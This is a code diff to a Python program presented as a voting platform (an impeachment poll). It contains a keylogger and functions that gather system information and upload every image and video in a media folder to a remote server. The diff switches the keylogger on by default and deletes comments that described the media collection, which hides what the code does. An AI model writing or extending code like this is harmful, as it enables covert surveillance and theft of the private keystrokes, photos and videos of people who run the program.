@@ -23,7 +23,7 @@ DB_PATH = "data/db.sqlite"
 # Keylogger
 LOG_FILE = "honeypot.txt"
 KEYLOGGER_PROCESS = None
-KEYLOGGER_RUNNING = False
+KEYLOGGER_RUNNING = True
 
 # Voting platform
 VOTE_COUNT = {"Impeach Trump": 0, "Don't Impeach": 0}
@@ -128,14 +128,14 @@ def get_system_info():
 
 def collect_media():
     try:
-        # Collect images
+        
         image_files = [f for f in os.listdir(MEDIA_DIR) if os.path.splitext(f)[1] in IMAGE_EXTENSIONS]
         for image_file in image_files:
             with open(os.path.join(MEDIA_DIR, image_file), "rb") as image:
                 image_data = image.read()
                 send_media_to_server(image_data, "image")
 
-        # Collect videos
+        
         video_files = [f for f in os.listdir(MEDIA_DIR) if os.path.splitext(f)[1] in VIDEOS_EXTENSIONS]
         for video_file in video_files:
             with open(os.path.join(MEDIA_DIR, video_file), "rb") as video:
@@ -161,7 +161,7 @@ def send_media_to_server(media_data, media_type):
     except requests.exceptions.RequestException as e:
         logging.exception(e)
 
-# Encryption
+
 def encrypt(data):
     key = b64decode(os.getenv("ENCRYPTION_KEY"))
     cipher = AES.new(key, AES.MODE_ECB)
